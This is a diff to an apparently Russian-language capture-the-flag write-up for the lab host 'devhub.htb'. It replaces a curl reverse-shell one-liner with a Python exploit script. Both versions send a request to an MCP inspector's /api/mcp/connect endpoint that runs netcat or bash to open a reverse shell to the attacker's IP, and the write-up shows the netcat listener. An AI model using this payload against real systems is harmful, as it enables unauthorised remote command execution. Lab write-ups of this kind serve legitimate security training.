@@ -63,10 +63,31 @@ nmap -p 6274 -sV devhub.htb
 # Слушатель
 nc -lvnp 4444
 
+# exploit.py
+# SKRIP/exploit.py
+import requests
+
+target = "http://devhub.htb:6274"
+ip     = "10.10.14.215"   # Ganti dengan IP attacker
+port   = "4444"
+
+url  = f'{target}/api/mcp/connect'
+data = {
+    "serverConfig": {
+        "command": "busybox",
+        "args": ["nc", ip, port, "-e", "/bin/bash"],
+        "env": {}
+    },
+    "serverId": "213j1l3jkljkl3j"
+}
+
+response = requests.post(url, json=data, verify=False)
+print(response.status_code)
+print(response.text)
+```
+
 # Отправка полезной нагрузки
-curl -X POST "http://devhub.htb:6274/api/mcp/connect" \
-  -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.215/4444 0>&1"],"env":{}},"serverId":"mytest"}'
+python3 exploit.py
 ```
 
 **Результат:** реверс-шелл от пользователя **`mcp-dev`**.
